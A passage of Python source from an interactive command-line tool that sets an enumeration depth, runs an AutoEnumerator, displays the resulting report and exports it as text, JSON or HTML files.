                new_depth = int(Prompt.ask("Enter maximum depth", default=str(default_depth)))
                if new_depth < 1:
                    console.print("[yellow]Depth must be at least 1, using default[/yellow]")
                    new_depth = default_depth
                session_data['AUTO_ENUMERATE_DEPTH'] = new_depth
                console.print(f"[green]Depth set to: {new_depth}[/green]\n")
            except ValueError:
                console.print("[yellow]Invalid depth, using default[/yellow]\n")
        
        enumerator = AutoEnumerator(console, session_data)
        
        console.print("\n[bold yellow]Starting comprehensive enumeration...[/bold yellow]\n")
        
        # Run enumeration
        enumeration_data = enumerator.run_full_enumeration()
        
        # Generate report
        report_gen = ReportGenerator(console, enumeration_data)
        report_gen.display_report()
        
        # Export options
        console.print("\n[bold]Export Options:[/bold]\n")
        
        export_format = Prompt.ask(
            "Export format",
            choices=['text', 'json', 'html', 'all', 'none'],
            default='all'
        )
        
        if export_format != 'none':
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            
            if export_format in ['text', 'all']:
                text_report = report_gen.generate_text_report()
                filename = f"enumeration_report_{timestamp}.txt"
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(text_report)
                console.print(f"[green]Text report saved:[/green] {filename}")
            
            if export_format in ['json', 'all']:
                json_report = report_gen.generate_json_report()
                filename = f"enumeration_report_{timestamp}.json"
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(json_report)
                console.print(f"[green]JSON report saved:[/green] {filename}")
            
            if export_format in ['html', 'all']:
                html_report = report_gen.generate_html_report()
                filename = f"enumeration_report_{timestamp}.html"
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(html_report)
                console.print(f"[green]HTML report saved:[/green] {filename}")
        
        console.print("\n[green]Enumeration complete![/green]")
